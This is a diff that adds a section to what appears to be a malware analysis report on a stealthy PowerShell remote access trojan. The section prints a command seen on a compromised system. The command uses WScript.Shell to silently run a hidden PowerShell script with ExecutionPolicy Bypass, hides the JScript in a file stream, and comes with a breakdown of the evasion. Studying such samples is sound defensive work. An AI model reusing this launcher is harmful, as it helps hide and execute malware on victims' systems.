@@ -84,3 +84,24 @@ Below is a decoded summary of the malicious PowerShell code discovered:
 - Loads and executes staged payloads using `Invoke-FruityC2`
 
 > This script is a highly flexible and evasive Remote Access Trojan (RAT) built for stealth and control.
+
+
+---
+
+## Command Observed (Execution Chain)
+
+The following command was identified on the compromised system:
+
+```powershell
+cmd.exe /c "echo var wshShell = new ActiveXObject('WScript.Shell');
+wshShell.CurrentDirectory = 'C:\Users\<username>\AppData\Roaming';
+wshShell.Run('%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File C:\CSI\module.ps1', 0, false); > C:\CSI:.js"
+```
+
+### Breakdown:
+- Uses `ActiveXObject(WScript.Shell)` to invoke PowerShell silently
+- Sets working directory to `%AppData%\Roaming` (common for malware staging)
+- Executes a hidden script (`module.ps1`) using **ExecutionPolicy Bypass**
+- Outputs a disguised script file to `C:\CSI:.js`, suggesting **stealth via fake file extension**
+
+This behavior strongly supports the presence of a stealth RAT using script-based execution, likely tied to a persistence mechanism like **Scheduled Tasks** or **registry autoruns**.
